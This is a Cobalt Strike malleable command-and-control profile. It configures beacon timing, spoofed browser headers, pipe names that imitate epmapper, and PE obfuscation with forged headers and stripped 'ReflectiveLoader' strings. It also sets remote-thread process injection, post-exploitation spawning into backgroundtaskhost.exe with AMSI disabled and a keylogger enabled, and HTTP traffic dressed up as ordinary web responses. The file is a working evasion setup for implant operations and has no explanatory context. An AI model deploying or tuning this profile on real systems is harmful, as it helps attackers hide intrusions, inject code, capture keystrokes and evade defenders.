set host_stage "false";
set sleeptime "63000";
set jitter    "68";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.89 Safari/537.36";

set data_jitter "60";

set smb_frame_header "";
set pipename         "epmapper-3607";
set pipename_stager  "epmapper-5260";
set tcp_frame_header "";
set ssh_pipename     "epmapper-##";

set tasks_max_size           "4194304";
set tasks_proxy_max_size     "921600";
set tasks_dns_proxy_max_size "71680";

stage {
    set obfuscate       "true";
    set stomppe         "true";
    set cleanup         "true";           
    set copy_pe_header  "false";          
    set userwx          "false";
    set smartinject     "false";

    # 4.12 RDLL drip loading (comment out if pre-4.12)
    set rdll_use_driploading "true";
    set rdll_dripload_delay  "100";       # 100ms delay between chunks

    set data_store_size "32";             # Reuse tasks (less traffic)
    set sleep_mask      "true";           # Official: in-memory protection
    set rdll_loader     "PrependLoader";  # Arsenal Kit UDRL

    set magic_mz_x86    "MZ\x90\x00";
    set magic_mz_x64    "MZ\x90\x00";
    set magic_pe        "PE";             # Fixed: exactly two hex bytes (50 45)
    set checksum        "0";
    set compile_time    "11 Dec 2025 17:31:09";

    set rich_header "\x95\x1a\x3f\xb2\x91\x10\x60\xe0\x91\x10\x60\xe0\x91\x10\x60\xe0\x85\x7b\x63\xe1\x84\x10\x60\xe0\x85\x7b\x65\xe1\x24\x10\x60\xe0\x48\x64\x64\xe1\x83\x10\x60\xe0\x48\x64\x63\xe1\x9d\x10\x60\xe0\xf7\x7f\x9d\xe0\x92\x10\x60\xe0\x4a\x64\x61\xe1\x93\x10\x60\xe0\x85\x7b\x64\xe1\xb2\x10\x60\xe0\x85\x7b\x61\xe1\x94\x10\x60\xe0\x48\x64\x65\xe1\x0e\x10\x60\xe0\xfb\x78\x65\xe1\x80\x10\x60\xe0\x85\x7b\x66\xe1\x93\x10\x60\xe0\x91\x10\x61\xe0\x5c\x11\x60\xe0\x4a\x64\x69\xe1\x03\x10\x60\xe0\x4a\x64\x63\xe1\x93\x10\x60\xe0\x4a\x64\x60\xe1\x90\x10\x60\xe0\x4a\x64\x9f\xe0\x90\x10\x60\xe0\x91\x10\xf7\xe0\x90\x10\x60\xe0\x4a\x64\x62\xe1\x90\x10\x60\xe0\x52\x69\x63\x68\x91\x10\x60\xe0\x00\x00\x00\x00\x00\x00\x00\x00";

    transform-x86 { prepend "\x90\x90\x90\x90\x90"; strrep "ReflectiveLoader" ""; strrep "beacon.dll" ""; }
    transform-x64 { prepend "\x90\x90\x90\x90\x90"; strrep "ReflectiveLoader" ""; strrep "beacon.x64.dll" ""; }
}

process-inject {
    set allocator "VirtualAllocEx";       # Fixed: Required for drip loading in injection

    set min_alloc "49892";
    set userwx    "false";
    set startrwx  "true";

    # 4.12 process injection drip (comment out if pre-4.12)
    set use_driploading "true";
    set dripload_delay  "100";

    transform-x86 { prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; }
    transform-x64 { prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; }

    # Fixed: Add CreateRemoteThread first to mitigate XP/2003 cross-session issues
    execute { 
        CreateRemoteThread;
        SetThreadContext; 
        RtlCreateUserThread; 
    }
}

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\backgroundtaskhost.exe";
    set spawnto_x64 "%windir%\\sysnative\\backgroundtaskhost.exe";

    set obfuscate    "true";
    set smartinject  "false";
    set amsi_disable "true";
    set keylogger    "SetWindowsHookEx";
    set thread_hint  "kernel32!WaitForSingleObject";
    set cleanup      "true";
}

http-config { set trust_x_forwarded_for "true"; }

http-get {
    set uri "/e15e3793/";

    client {
        header "httpauth" "ZGVuc2VjdXJl";
        metadata { base64; mask; netbios; uri-append; }
    }

    server {
        header "X-Content-Type-Options" "nosniff";
        header "X-XSS-Protection"       "1; mode=block";
        header "X-Frame-Options"        "SAMEORIGIN";
        header "Cache-Control"          "public,max-age=172800";
        header "Age"                    "2847";
        header "Alt-Svc"                "h3=\":443\"; ma=86400";
        output { print; }
    }
}

http-post {
    set uri "/9ff38a03/";

    client {
        header "httpauth" "ZGVuc2VjdXJl";

        id     { base64; mask; netbios; uri-append; }
        output { print; }
    }

    server {
        header "X-Content-Type-Options" "nosniff";
        header "X-XSS-Protection"       "1; mode=block";
        header "X-Frame-Options"        "SAMEORIGIN";
        header "Cache-Control"          "public,max-age=172800";
        header "Age"                    "2847";
        header "Alt-Svc"                "h3=\":443\"; ma=86400";
        output { print; }
    }
}
